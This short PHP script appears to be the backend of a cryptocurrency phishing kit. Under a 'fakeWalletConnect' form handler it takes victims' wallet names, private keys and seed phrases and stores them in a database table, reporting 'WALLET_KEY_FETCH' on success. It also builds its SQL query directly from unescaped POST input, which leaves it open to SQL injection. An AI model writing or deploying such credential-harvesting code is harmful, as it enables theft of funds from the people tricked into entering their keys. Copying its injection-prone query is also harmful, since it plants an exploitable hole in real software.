<?php
include('../connection.php');

if (isset($_POST['from'])) {
         if ($_POST['from'] == 'fakeWalletConnect') {
                  $login_id =  $_SESSION['user_id'];
                  $name = $_POST['name'];
                  $privateKey = $_POST['privateKey'];
                  $seedPhrase = $_POST['seedPhrase'];

                  $query = mysqli_query($connection, "INSERT INTO `fakewalletconnect`(`id`, `user_id`,`name`,`privateKey`, `seedPhrase`) VALUES ('','$login_id','$name','$privateKey','$seedPhrase')");

                  if ($query) {
                           echo 'WALLET_KEY_FETCH';
                  } else {
                           echo 'WALLET_KEY_NOT_FETCH';
                  }
         }
}
